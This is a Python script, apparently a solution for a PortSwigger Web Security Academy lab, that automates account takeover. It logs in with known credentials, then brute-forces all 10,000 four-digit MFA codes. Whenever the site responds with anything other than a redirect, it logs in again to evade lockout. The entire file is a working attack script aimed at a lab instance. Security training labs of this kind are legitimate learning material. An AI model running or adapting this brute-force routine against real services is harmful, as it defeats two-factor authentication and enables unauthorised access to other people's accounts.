# Autonomous proof-of-concept script for Portswigger Lab: 
# ""

import requests
import sys

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

ERROR_CODE = 1
BASE_URL = "https://0aa600c8043989c884ca4aab004300c9.web-security-academy.net/"
PROXIES = {
     "http": "http://127.0.0.1:8080", 
     "https": "http://127.0.0.1:8080",
}
USER = "carlos"
PASSWORD = "montoya"


def get_session_cookie():
    try:
        response = requests.get(BASE_URL, proxies=PROXIES, verify=False)
    except Exception as general_exception:
            print(f"[INFO ] An exception occurred: {general_exception}")
            sys.exit(ERROR_CODE)

    if response.status_code == 200:
        return response.cookies


def get_login_csrf_token(session_cookie):
    endpoint = "login"
    url = f"{BASE_URL}/{endpoint}"

    try:
        response = requests.get(url, cookies=session_cookie, 
                                proxies=PROXIES, verify=False)
    except Exception as general_exception:
            print(f"[INFO ] An exception occurred: {general_exception}")
            sys.exit(ERROR_CODE)

    if "csrf" in response.text:
        login_csrf_token = (response.text.split("csrf")[1]
                                   .split("value=")[1]
                                   .split(">")[0]
                                   .replace('"', ''))
        return login_csrf_token


def login(session_cookie, login_csrf_token, user, password):
    endpoint = "login"
    url = f"{BASE_URL}/{endpoint}"

    data = {
        "csrf": login_csrf_token,
        "username": user,
        "password": password,
    }

    try:
        response = requests.post(url, cookies=session_cookie, 
                                 data=data, proxies=PROXIES, 
                                 verify=False, allow_redirects=False)
    except Exception as general_exception:
            print(f"[INFO ] An exception occurred: {general_exception}")
            sys.exit(ERROR_CODE)

    if response.status_code != 302:
            print("[INFO ] An error occurred while logging in")
            sys.exit(ERROR_CODE)

    return response.cookies


def get_login2_csrf_token(login_cookies):
    endpoint = "login2"
    url = f"{BASE_URL}/{endpoint}"

    try:
        response = requests.get(url, cookies=login_cookies, proxies=PROXIES, 
                                verify=False, allow_redirects=False)
    except Exception as general_exception:
        print(f"[INFO ] An exception occurred: {general_exception}")
        sys.exit(ERROR_CODE)

    if "csrf" in response.text:
        login2_csrf_token = (response.text.split("csrf")[1]
                                   .split("value=")[1]
                                   .split(">")[0]
                                   .replace('"', ''))
        return login2_csrf_token


def bruteforce_mfa_code(login_cookies, login2_csrf_token):
    endpoint = "login2"
    url = f"{BASE_URL}/{endpoint}"

    for number in range(10000):
        mfa_code = str(number).zfill(4)
        
        data = {
              "csrf": login2_csrf_token,
              "mfa-code": mfa_code,
        }

        print(f"\r[DEBUG] Trying mfa-code combination '{mfa_code}'", end="")

        try:
            response = requests.post(url, cookies=login_cookies, 
                                     data=data, proxies=PROXIES, 
                                     verify=False, allow_redirects=False)
        except Exception as general_exception:
            print(f"[INFO ] An exception occurred: {general_exception}")
            sys.exit(ERROR_CODE)

        if response.status_code != 302:
            session_cookie = get_session_cookie()
            
            login_csrf_token = get_login_csrf_token(session_cookie=session_cookie)
            
            login_cookies = login(session_cookie=session_cookie, 
                                  login_csrf_token=login_csrf_token, 
                                  user=USER, password=PASSWORD)
            
            login2_csrf_token = get_login2_csrf_token(login_cookies=login_cookies)
            
        elif "Incorrect security code" not in response.text:
            print(f"[INFO ] Mfa-code found: {mfa_code}")
            return mfa_code


def main():
    session_cookie = get_session_cookie()

    login_csrf_token = get_login_csrf_token(session_cookie=session_cookie)

    login_cookies = login(session_cookie=session_cookie, 
                          login_csrf_token=login_csrf_token, 
                          user=USER, password=PASSWORD)
    
    login2_csrf_token = get_login2_csrf_token(login_cookies=login_cookies)

    mfa_code = bruteforce_mfa_code(login_cookies=login_cookies, login2_csrf_token=login2_csrf_token)


if __name__ == "__main__":
    main()